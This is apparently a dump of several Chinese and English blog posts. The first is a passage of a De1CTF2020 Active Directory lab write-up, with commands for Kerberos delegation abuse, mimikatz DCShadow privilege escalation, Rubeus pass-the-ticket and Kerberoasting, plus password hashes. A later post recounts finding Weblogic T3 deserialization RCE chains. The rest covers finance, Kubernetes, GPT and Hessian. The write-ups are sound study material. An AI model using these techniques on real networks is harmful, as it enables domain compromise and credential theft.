/tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi /user:Administrator@De1CTF2020.lab /service:cifs/DM.De1CTF2020.lab S4U2self成功S4U2Proxy失败（当时反复确认过委派加上了的） 换个工具rubues 但是dir始终不成功（后来问了一个师傅答复是：访问自己本身默认都是用当前用户身份去认证，不走网络认证，必须得主动调用网络认证才行）。 走到这里天色已晚有点肝不动了，就没继续了。第二天比赛结束出题师傅给我说用impakect就可以s4u而且能成。 12345proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$export KRB5CCNAME=/root/impacket-master/examples/lisan4$.ccacheproxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$export KRB5CCNAME=/root/impacket-master/examples/Administrator.ccacheproxychains psexec.py -k -no-pass dm.De1CTF2020.lab 这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。 这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。 这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。 有system权限后就是Dcshadow的操作了 system权限下 1shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot; 我一直以为这种非交互式的mimkatz运行完会被beacon自动关闭掉，实际测下来并不会。 De1ta权限下 1shell mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot; 执行完后system那边会有反应 1shell net group &quot;domain admins&quot; /domain 会发现加上了 照理可以直接dir了但是最后还是有一个莫名其妙的坑（忽视图中把路径写错了，不过不影响这里的意思就是没权限，路径不存在是另外一个报错） 用rubues重新来一次tgt就好了 12shell Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /pttshell type \\\\dc\\c$\\users\\Administrator\\Desktop\\flag.txt 来说说预期解拿到De1ta账号密码 1shell setspn -s http/DM.De1CTF2020.lab De1CTF2020\\De1ta 1shell cscript GetUserSPNs.vbs 12powershell-import /Users/cengsiqi/Desktop/pentest/Empire/data/module_source/credentials/Invoke-Kerberoast.ps1powershell Invoke-Kerberoast 123456789101112131415161718192021222324252627282930313233343536373839404142TicketByteHexStream : Hash : $krb5tgs$http/DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46 955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94 615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5 AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7 1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91 8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83 9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F 426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B 10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538 4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2 3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C 296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9 8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0 5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A 48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9 BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2 5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36 D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB 3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753 9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970 D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046 1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40 AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838 736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87 61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38 4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE 59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD 00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0 DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6 7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8 F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69 6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3 1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15 43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968 90F72E86D900D78BE6006BD14E1380725D1D8SamAccountName : De1taDistinguishedName : CN=De1ta,CN=Users,DC=De1CTF2020,DC=labServicePrincipalName : http/DM.De1CTF2020.lab 1hashcat -m 13100 -a 0 kerberos.txt cracks.txt ps：用ps也可以GetSPNUser 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/kerberoast/GetUserSPNs.ps1powershell GetUserSPNs","link":"/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/"},{"title":"Financial Economics Lecture1 Foundations, Approaches, and Key Concepts in Asset Pricing","text":"I. Introduction to Financial Economics A. Definition and Scope Financial Economics: The branch of economics focuses on assigning financial assets efficiently. Core task: Understanding and determining the pricing of financial assets. B. Key Concepts Assets: Claims on future economic benefits. Two critical dimensions in financial behavior: Intertemporal nature of decisions **Uncertainty (risk) **associated with future outcomes II. Overview of Financial Markets A. Basic Structure 12Funds Suppliers (Asset Buyers) → Investment → Funds Demanders (Asset Sellers) ← Return ← B. Key Focus Central question: Determining asset prices Pricing mechanism: Driven by supply and demand, which are derived from human behavior Challenges: Human behavior is dynamic and uncertain C. Corporate Finance Special case: When asset sellers are corporations III. Approaches in Financial Economics A. Equilibrium Pricing Method: Build a model incorporating human preferences and constraints to deduce behavior and determine supply and demand. Advantage: Can determine asset prices from fundamental principles. Disadvantage: Relies on assumptions that may be inaccurate or oversimplified. B. No-Arbitrage Pricing Method: Deduce asset prices based on known prices of other assets. C. Financial Frictions Analysis Focus areas: Information asymmetry, period mismatch D. Behavioral Finance Approach: Incorporates “irrational” factors to better understand the behavior of market participants. IV. Market Efficiency and Behavioral Finance Question of market efficiency remains central to financial economics. Behavioral finance helps explain deviations from traditional rational models. V. Assets and Rate of Return A. Basic Model: Single-Period Binary Tree Current price: P Future payoffs: Xu (probability q) Xd (probability 1-q) B. Key Questions Given Xu and Xd, how to determine P? What determines Xu and Xd? (Beyond the scope of financial economics) Industry factors Business strategies Competitive landscape Management aspirations Macroeconomic conditions Geopolitical factors C. Return Calculations Upside return: ru = (Xu/P) - 1 Downside return: rd = (Xd/P) - 1 Expected return: E® = q*ru + (1-q)*rd = E(x)/P - 1 D. Price-Return Relationship Inverse relationship between price (P) and expected return E® Higher asset price → Lower expected return Lower asset price → Higher expected return E. Risk-Return Trade-off “Good” assets typically have higher prices but lower expected returns “Bad” (riskier) assets typically have lower prices but higher expected returns Market equilibrium tends to balance risk and return across assets VI. Equilibrium Pricing (Absolute Pricing) A. Concept Price is determined by the interaction of supply, demand, and behavior (under uncertainty/risk) Aims to price assets from fundamental principles B. Expected Utility Theory Addresses limitations of simple expected value calculations Example: St. Petersburg paradox (where E = ∞) Demonstrates why expected value alone is insufficient for decision-making C. Risk and Asset Pricing: An Example Steel Company: Current price: Ps Future dividends: 50% chance of 25,15 Pharmaceutical Company: Current price: Pp Future dividends: 50% chance of 40,0 Despite pharmaceutical companies having higher variance (risk), Pp should typically be higher than Ps. This counterintuitive result stems from the potential for higher returns, not just the risk involved. D. Performance Evaluation: Beyond Simple Metrics Consider two portfolio managers: Manager A: Average return rA = 10%, standard deviation σA Manager B: Average return rB = 8%, standard deviation σB If σA &lt; σB, can we conclude A is better than B? Not necessarily. Must consider risk-adjusted returns and investor preferences. VII. No-Arbitrage Pricing (Relative Pricing) A. Concept Based on the Law of One Price (LOOP) Riskless profit opportunities violate LOOP B. Examples Fast Food Combo: If Hamburg = 1 and Coke=1, then (Hamburg, Coke) combo should = $2 Any deviation creates arbitrage opportunity Investment Box: Box transforms 1 into 1.02 (2% return) Bank deposit rate = 3% Box value? Not zero, despite lower return than bank Option value exists if interest rates fall below 2% in future C. Replication and Hedging Core of no-arbitrage pricing: Replicating cash flows Enables hedging strategies Fundamental to modern financial innovations VIII. Financial Frictions A. Maturity Mismatch Lenders prefer liquidity (short-term) Borrowers need stability (long-term) Example: Construction projects require stable, long-term funding B. Role of Financial Intermediaries Banks transform short-term deposits into long-term loans Crucial for economic stability and growth IX. Market Efficiency and Behavioral Finance A. Efficient Market Hypothesis (EMH) Fama’s theory: Markets rapidly incorporate all available information Implies no persistent arbitrage opportunities B. Challenges to EMH Shiller’s counterarguments Behavioral Finance insights: Irrationality: e.g., overconfidence bias Limited arbitrage: Practical limits to exploiting mispricings C. Martingale Concept Mathematical foundation for fair games and efficient markets Key Takeaways from Lecture 1 Financial Economics focuses on the efficient allocation of financial assets and understanding asset pricing. The field employs various approaches: equilibrium pricing, no-arbitrage pricing, and consideration of financial frictions. Understanding risk, return, and their relationship is crucial in asset valuation. Market efficiency and behavioral factors play significant roles in financial markets. Both absolute (equilibrium) and relative (no-arbitrage) pricing methods are essential tools in financial economics. Financial frictions, such as maturity mismatches, highlight the importance of financial intermediaries.","link":"/2024/09/14/Financial-Economics-Lecture1-Foundations-Approaches-and-Key-Concepts-in-Asset-Pricing/"},{"title":"Fix CrashLoopBackOff when using kubeadm to init cluster","text":"问题的解决 这个问题，问AI一直没有解决，简中互联也没搜到。最后再gitlab issue里面找到答案。因此快速记一下修复原理。 解决问题的issue在 https://github.com/kubernetes/kubeadm/issues/2833 https://github.com/etcd-io/etcd/issues/13670 问题的特征是用kubeadm init启动，像issue里面会遇到CrashLoopBackOff 12345678910root@student-VMware-Virtual-Platform:/home/student/Desktop# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-668d6bf9bc-mc5mn 0/1 Pending 0 119scoredns-668d6bf9bc-sd84z 0/1 Pending 0 119setcd-student-vmware-virtual-platform 1/1 Running 2 (2m53s ago) 2m57skube-apiserver-student-vmware-virtual-platform 1/1 Running 2 (2m23s ago) 2m57skube-controller-manager-student-vmware-virtual-platform 1/1 Running 4 (2m53s ago) 2m57skube-proxy-7k6hq 1/1 Running 2 (41s ago) 2mkube-scheduler-student-vmware-virtual-platform 0/1 CrashLoopBackOff 4 (22s ago) 2m57sroot@student-VMware-Virtual-Platform:/home/student/Desktop# 然后慢慢的整个集群在挂掉，使用不了kubectl。 12root@student-VMware-Virtual-Platform:/home/student/Desktop/lk8s# kubectl get pods -n kube-system The connection to the server 192.168.220.128:6443 was refused - did you specify the right host or port? 看apiserver的容器日志发现它就是收到了信号被关了，也没有error错误。 解决方法是在/etc/containerd/config.toml 12/etc/containerd/vim /etc/containerd/config.toml 添加配置 123456789version = 2[plugins] [plugins.&quot;io.containerd.grpc.v1.cri&quot;] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes] [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc] runtime_type = &quot;io.containerd.runc.v2&quot; [plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc.options] SystemdCgroup = true 产生问题的原因 根据issue的里面指导可以看到k8s文档，在linux下又两个cgroup driver，一个是cgroupfs，一个是systemd。 Kubelet和容器运行时必须要使用一样的cgroup driver才可以。 It’s critical that the kubelet and the container runtime use the same cgroup driver and are configured the same. 根据文档所说kubelet默认情况下用的是cgroupfs 但是我这里使用kubeadm v1.32，默认是用的systemd 1cat /var/lib/kubelet/config.yaml | grep cgroupDriver 再看containerd配置，看到默认是cgroupfs而不是system 1containerd config default &gt; /tmp/1.txt systemd_cgroup = false [plugins.“io.containerd.grpc.v1.cri”.containerd.runtimes.runc.options] BinaryName = “” CriuImagePath = “” CriuPath = “” CriuWorkPath = “” IoGid = 0 IoUid = 0 NoNewKeyring = false NoPivotRoot = false Root = “” ShimCgroup = “” SystemdCgroup = false 如文档所说，两套cgroup manager同时用会导致不稳定，需要修改runc的启动参数。","link":"/2025/01/12/Fix-CrashLoopBackOff-when-using-kubeadm-to-init-cluster/"},{"title":"Does GPT&#39;s &#39;decoder-only&#39; architecture mean it consists of only a decoder?","text":"GPT的decoder-only是只有decoder吗？ 事情的起因是我和朋友争论GPT模型到底有没有encoder。他认为GPT或类似的模型其实有一个很小的encoder，并且encoder和decoder之间会有cross attention。而我的观点则是GPT只有decoder部分，没有encoder。 于是有了这篇论文考古。 GPT 论文链接：https://cdn.openai.com/research-covers/language-unsupervised/language\\_understanding\\_paper.pdf GPT 1.0 GPT1.0分为训练和微调 训练 微调 训练就是纯预测（优化一个目标函数），微调是同时做预测和分类（作者发现这样泛化性更好），优化目标为一组目标函数的和。 架构图可以到，就是只用了解码器，没有用编码器。 论文中谈及架构的时候提到了引用34和62。说他们使用的decoder是来自transformer的一个变体。 GENERATING WIKIPEDIA BY SUMMARIZING LONG SEQUENCES Attention is all you need. 34的文章提出了一个decoder-only的架构，用来生成像维基百科一样的文章，作者认为用decoder-only能够关注更长的序列，这比常见的在序列转换任务中使用的编码器—解码器架构所能处理的序列要长得多。在引言部分和模型示例图可以看到他们模型只包含deocder. 作者仅以不做了实验发现，比起encoder-decoder架构，decoder-only能微量提点，但是能处理的长度显著增加。 那么原来做cross attention那一层去哪里了？ 在GPT1.0和它引用的论文里面是直接删掉了。只有masked multi-head attention GPT 2.0 那在GPT2.0, 3.0用了吗？ Language Models are Unsupervised Multitask Learners https://cdn.openai.com/better-language-models/language\\_models\\_are\\_unsupervised\\_multitask\\_learners.pdf GPT2.0在模型描述里面提到只在GPT1.0上做了微小改动，如果加了encoder应该属于模型大变化，应该会提到。 从源码里面看就是decoder-only https://github.com/openai/gpt-2/blob/master/src/model.py GPT 3.0 Language Models are Few-Shot Learners https://arxiv.org/pdf/2005.14165 提到架构和GPT2.0一样 GPT 4.0 CloseAI的技术报告没有提模型细节，一种比较可靠的说法是他们要做多模态所以引入的ViT或者clip之类的技术理解媒体文件。但是这里我猜应该是只是做完embedding和文字的embedding一起输入，不能算是有&quot;cross-attention&quot;的encoder。 Decoder only有什么好处？ 这里借用知乎这里的讨论 重新梳理一下。 注意力机制的数学特性（苏剑林观点） **核心观点：**双向注意力容易退化为低秩，而因果注意力必然满秩。 详细解释与例子： 1234567891011121314151617181920双向注意力示例句子：&quot;我爱北京天安门&quot;双向注意力矩阵（简化示例）[[0.2, 0.2, 0.2, 0.2, 0.2], &quot;我&quot;看所有词[0.2, 0.2, 0.2, 0.2, 0.2], &quot;爱&quot;看所有词[0.2, 0.2, 0.2, 0.2, 0.2], &quot;北京&quot;看所有词[0.2, 0.2, 0.2, 0.2, 0.2], &quot;天安&quot;看所有词[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有词]容易退化为低秩：所有行向量相似因果注意力示例（decoder-only）[[1.0, 0, 0, 0, 0], &quot;我&quot;只看自己[0.5, 0.5, 0, 0, 0], &quot;爱&quot;看&quot;我&quot;和自己[0.3, 0.3, 0.4, 0, 0], &quot;北京&quot;看前面的词[0.2, 0.2, 0.3, 0.3, 0], &quot;天安&quot;看前面的词[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有前面的词]下三角矩阵，必然满秩，表达能力更强 如果注意力矩阵变成低秩，相当于模型&quot;眼里看到的东西都一样&quot;，很多不同的位置/内容其实被糊成了一坨，没法细致地区分信息。 预测任务难度与泛化能力（@yili观点） **核心观点：**更难的预测任务促使模型学习更好的通用表征。 具体例子： 预测&quot;北京&quot;这个词时： Encoder-Decoder：可以看到完整句子&quot;我爱[MASK]天安门&quot;，从两边获取信息 Decoder-Only：只能看到&quot;我爱&quot;，必须从更少的信息中推断 这种&quot;信息饥渴&quot;迫使模型： 学习更强的语言模型能力 更好地理解词序和语法结构 形成更通用的表征 上下文学习的天然优势（@mimimumu观点） **核心观点：**Decoder-only架构让prompt能直接作用于每一层。 Few-shot学习示例： 1234567输入你给出的格式去掉多余斜线，改成：问：什么是机器学习？答：机器学习是让计算机从数据中学习的技术。问：什么是深度学习？答：[模型生成] 在Decoder-only中： 每个token的表示逐层构建时，都能直接参考前面的示例 Prompt信息像&quot;隐式微调&quot;一样影响每一层的计算 而Encoder-Decoder需要先编码完整输入，再解码，信息传递路径更长。 隐式位置编码特性 **核心观点：**因果注意力天然具有位置敏感性。 对比例子： 123456789101112131415没有位置编码的双向注意力&quot;我爱你&quot; 和 &quot;你爱我&quot; 可能产生相似的表示因果注意力（即使没有显式位置编码）&quot;我爱你&quot;：&quot;我&quot;：只看自己&quot;爱&quot;：看&quot;我&quot;+&quot;爱&quot;&quot;你&quot;：看&quot;我&quot;+&quot;爱&quot;+&quot;你&quot;&quot;你爱我&quot;：&quot;你&quot;：只看自己&quot;爱&quot;：看&quot;你&quot;+&quot;爱&quot;&quot;我&quot;：看&quot;你&quot;+&quot;爱&quot;+&quot;我&quot;表示完全不同，天然区分语序 KV-Cache复用机制 123456789101112第一轮用户：&quot;介绍一下北京&quot;模型：生成回答，缓存所有KV第二轮用户：&quot;它的人口有多少？&quot;Decoder-only：直接复用第一轮的KV-Cache只需计算新输入的KV，效率极高Encoder-Decoder：需要重新编码整个上下文因为encoder看到的是完整输入，任何改变都需要重新计算","link":"/2025/05/24/GPT%E7%9A%84decoder-only%E6%98%AF%E5%8F%AA%E6%9C%89decoder%E5%90%97/"},{"title":"Hessian 序列化代码分析及业务场景学习","text":"介绍 Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能。早在08年有人做过测试：一个UserData类，有一个字符串属性，一个日期属性,一个double属性，分别用java,hessian来序列化一百万次,结果让人吃惊,不止是hessian序列化的速度要比java的快上一倍，而且hessian序列化后的字节数也要比java的少一倍。 序列化 序列化宏观来看就四步 建立进行序列化的工厂类 用工厂类找到要要进行序列化类对应的序列化器 序列化器对将进行序列化的对象进行内省 内省完成后调用序列化器的writeObject（writeObject中按照一定规则把数据写入byte流） 下面用Hessian简单序列化一个对象来看 12345678910111213141516171819202122232425import com.caucho.hessian.io.HessianOutput;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.Serializable;class User implements Serializable { String name; int age; User() { age = 18; name = &quot;cl0und&quot;; }}public class HessianTest { public static void main(String[] args) throws IOException { User user = new User(); ByteArrayOutputStream os=new ByteArrayOutputStream(); HessianOutput output=new HessianOutput(os); output.writeObject(user); }} 建立进行序列化的工厂类 把ByteArrayOutputStream放入了HessianOutput中典型的装饰器模式。 新建序列工厂类（后续会通过工厂类来寻找类的对应序列化器）。 工厂类的创建过程中，在类静态块中加入了java各种类型的反序列器以及和Hessian有关的反序列器。这里和序列化没关系，只是提一嘴。 在类初始化完成后，正式进入SerializerFactory的构造方法。可以看到SerializerFactory允许不安全的序列化，设置默认的上下文工厂类是_contextFactory，这个_contextFactory是生产序列化器的工厂。 用工厂类找到要要进行序列化类对应的序列化器 根据传入类型获取相应的序列化器。 获取序列化器的规则是如果_cachedSerializerMap里面又就直接从里面取，如果没有就用loadSerializer找，找出来的加入_cachedSerializerMap避免二次加载。 loadSerializer找的逻辑是先看有没有其它工厂类，如果有就用，如果没有就用_contextFactory造。 因为User是自建类型_contextFactory造不出对应序列化器。 下一步尝试getCustomSerializer来找序列化器，看方法的意思应该是找是否有客户自己定制的序列化器。生成序列器规则是：如果_customSerializerMap有就直接返回，如果没有就按照_类名+HessianSerializer_的规则来找。很遗憾我们并没有对User做个性化定制。 因为没有我们没有对User做个性化的序列化器，所以最后会调用getDefaultSerializer来返回默认序列化器。又因为User既不是内置类也不是和hessian有关的特殊类但是允许了不安全的序列化，所以最后被选中的序列化器是UnsafeSerializer。 序列化器对序列化对象进行内省 在构造方法中使用introspect进行内省。 introspect最后几步是在为类里面的属性找序列化器（getFiledSerializer）。 比如这里User类中name属性是String，就创建针对String的序列化器。 String的序列化器包含了field类及其偏移量。 创建类及及其字段序列化器后一路向外传，然后调用writeObject。 writeObjectBegin 写了Object的魔术头、长度、类名 writeObject10 负责序列化字段 先是写要序列化的字符串魔术值、字段名长度、字段名，其中 os.write(83) 代表 S 代表字符串。 String类型学序列化的时候 int类型序列化的时候 最后的结果 业务场景 环境搭建 说穿了就是RPC，用实际的代码来看看 pom.xml加入 12345678910111213&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.caucho&lt;/groupId&gt; &lt;artifactId&gt;hessian&lt;/artifactId&gt; &lt;version&gt;4.0.60&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; web.xml 1234567891011121314151617181920&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;&lt;web-app&gt; &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt; &lt;servlet&gt; &lt;servlet-name&gt;HessianServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;com.caucho.hessian.server.HessianServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;service-class&lt;/param-name&gt; &lt;param-value&gt;org.syclover.hessian.BasicService&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;HessianServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/api/service&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 代码忘记从网上哪里copy的了，侵删。 client/server端共有代码 1234567891011121314package org.syclover.hessian;public interface IBasicApi { /* 设置用户名 */ public boolean setUserName(String name); /* 获取问候 */ public String sayHello(); /* 获取用户信息 */ public User getUser();} client端代码 12345678910111213141516171819package org.syclover.hessian;import com.caucho.hessian.client.HessianProxyFactory;import java.net.MalformedURLException;public class ClientTest { public static void main(String[] args) throws MalformedURLException { String url = &quot;http://localhost:8080/hessianTest_war_exploded/api/service&quot;; HessianProxyFactory factory = new HessianProxyFactory(); IBasicApi api = (IBasicApi) factory.create(IBasicApi.class, url); api.setUserName(&quot;mahc&quot;); System.out.println(api.sayHello()); System.out.println(api.getUser().getName()); System.out.println(api.getUser().getAge()); }} server端代码 123456789101112131415161718192021222324package org.syclover.hessian;import org.syclover.hessian.User;public class BasicService implements IBasicApi { private String name; @Override public boolean setUserName(String name) { this.name = name; return false; } @Override public String sayHello() { return &quot;Hello &quot; + name + &quot;,Welcome to Hessian!&quot;; } @Override public User getUser() { return new User(name, 23); }} 123456789101112131415161718192021222324252627282930313233343536package org.syclover.hessian;import java.io.Serializable;public class User implements Serializable { private String name; private Integer age; public User() { super(); } public User(String name, Integer age) { super(); this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; }} 这里为了测试方便把c/s放到一起了 进行RPC 参考 Hessian使用教程 JVM 类装载原理分析－ClassLoader原理分析 hessian 序列化实现 初探","link":"/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/"},{"title":"How Did I Find Weblogic T3 RCE","text":"文章首发于先知社区 ​ 获得噱头oracle公开致谢 之前这个补丁没有修好，有CVE-2021-2135和CVE-2021-2136两种绕过。 挖不动，把之前思路再发出来，等下个补丁日向师傅们学习了。 CASE 1 最初引起我注意的是ExternalizableLite#readExternalizableLite，可以看到这里直接从数据流里面读取了类名并新建对象。 下面又会调用value自身的readExternal((DataInput)in)方法。 新建出来的对象会调用自己的readExternal。 当对象构造好之后又会在realize中调用readResolve方法 结合这里三点来看，相当于是一个免黑名单检查的反序列化场景。 我们只需要往上回朔，看能否到反序列化的入口点就行了。 然后全局搜com.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)，可以在很多类的readExternal(java.io.DataInput)中看到这样的调用。 回朔到这一步的时候我还以为成了，但是测了一下发现，在反序列化的时候java根本不会调用这个方法。因为这里函数的签名是readExternal(java.io.DataInput)而不是正统的readExternal(java.io.ObjectInput)。 有些不甘心，于是乎把coherence.jar里面的readExternal(java.io.ObjectInput)全部抓了出来。 123456789101112com.oracle.common.internal.util.Histogramcom.tangosol.util.MapSetcom.tangosol.util.Binarycom.tangosol.util.LiteSetcom.tangosol.util.UUIDcom.tangosol.util.LiteMapcom.tangosol.run.xml.SimpleDocumentcom.tangosol.run.xml.XmlBeancom.tangosol.util.ConcurrentMap$1com.tangosol.coherence.component.net.Membercom.tangosol.net.security.PermissionInfocom.tangosol.coherence.mvel2.util.FastList 数量不是很多，一个一个手工看。很快啊，我啪一下就点到com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)里面了。 这个地方有强制类型转换，那么刚才的链路不就续上了？ 继续跟进，再一次失望，发现这里只读取长整型，并没有调用readObject。 然后接下来的所有类要么是转换成了DataInput但是没有readObject。要么是根本就没有强制转换。 还是不甘心，又看了一遍，在com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)处事情出现转机。 我发现在调用readCollection的时候传入的ObjectInput in会被隐式转换成DataInput in，并且里面刚好有readObject。 到这里一条从readExternal(java.io.ObjectInput) 到无视黑名单的反序列化路线在理论上似乎已打通，接下来的就是gadget后半段是选择，立马想到的是TemplatesImpl和RemoteConstructor（CVE-2020-14644）。我选择了后者，把payload构造好，再打上10月补丁（感谢给我补丁的师傅）一发入魂。 ps：这里readExternal(java.io.ObjectInput) -&gt; 无视黑名单的readObject的结论是不严谨的，选择TemplatesImpl也是打不通的，这个原因后面会解释。确实很尴尬，虽然能RCE，但是当时急于验证并未全流程调试过，对这个洞的理解比较片面。 至此第一个洞就结束了，当晚就给官方提漏洞。后面的几天我在反思这个洞， 为什么我能挖到？我想我能挖到原因是weblogic官方没有bug bounty前人可能没有注意到有进入到readExternal(DataInput in)通路。 为什么readExternal(ObjectInput in)可以续上？我想因为readExternal本来就是给程序员自定义反序列化数据的地方，而readExternal(DataInput in)里面是coherence自己的反序列化逻辑，所以从ObjectInput in能到DataInput in算是题中应有之义。 这种反序列化绕过方式属于哪种类型？我想应该是二阶反序列化类型。 CASE 2 几天后，我收到了官方回复的邮件，从它们回复中可以看到它们把这个链关键认定为RCE involving LambdaIdentity。此时，我觉得很奇怪难道后半段不是可以灵活吗？如果我重新找一个新入口配上7u21后半段岂不是能再混一个CVE？。然后抓了一下整个coherence lib目录下的所有jar包的readExternal(java.io.ObjectInput) 。 1234567891011121314com.oracle.common.internal.util.Histogramcom.tangosol.util.MapSetcom.tangosol.util.Binarycom.tangosol.util.LiteSetcom.tangosol.util.UUIDcom.tangosol.util.LiteMapcom.tangosol.run.xml.SimpleDocumentcom.tangosol.run.xml.XmlBeancom.tangosol.util.ConcurrentMap$1com.tangosol.coherence.component.net.Membercom.tangosol.net.security.PermissionInfocom.tangosol.coherence.mvel2.util.FastListcom.tangosol.coherence.servlet.AbstractHttpSessionModelcom.tangosol.coherence.servlet.AttributeHolder 倒数两个是比上次只跑conherence.jar多出来的，经过验证在conherence-web.jar中的com.tangosol.coherence.servlet.AttributeHolder满足条件。 把TemplatesImpl打到m_Value之后，发送payload后发现控制台报错。发生肾么事了？我一看，哦原来啊是没过黑名单，这就引起了对这个漏洞细节的进一步探究。 在com.tangosol.util.ExternalizableHelper#readObjectInternal下断点可以看到它并没进入，预期的readExternalizableLite而是进入了readSerializable中 在readObject中DataInput in会重新“转换”回带黑名单的InputStream，所以失败。 此时，心理又有两个疑问 输入流为我所控，那我把nType改成10，强行进入readExternalizableLite行不行？ 为什么RemoteConstructor可以打成功？ 首先回答第一个问题，可以但是行不通，就算真的把TemplatesImpl new出来了之后的强转也过不了。 其次，就算真的成功他也没有readExternal方法（即没有实现ExternalizableLite接口）。 到这里RemoteConstructor可以打的原因也很明显了RemoteConstructor实现了ExternalizableLite接口。 所以这个攻击面的利用条件是： 一个java.io.ObjectInput强转成java.io.DataInput的点 强转成java.io.DataInput后需要有进行ExternalizableHelper.readObject的操作 一个实现了ExternalizableLite的接口高危类 不过这已经足够了，因为conherence里面的Extractor都实现这个接口。 一开始，我其实是想手工挖的，那段时间真的是看的我头皮发麻，而且因为实现了ExternalizableLite接口是在是太多也很难保证自己完全不重不漏，大多数readExternal里面都只有赋值没有别的操作，休息了几天后我决定用魔法打败魔法，拿之前写的自动化工具跑。结合历史漏洞我决定以readExternal(DataInput 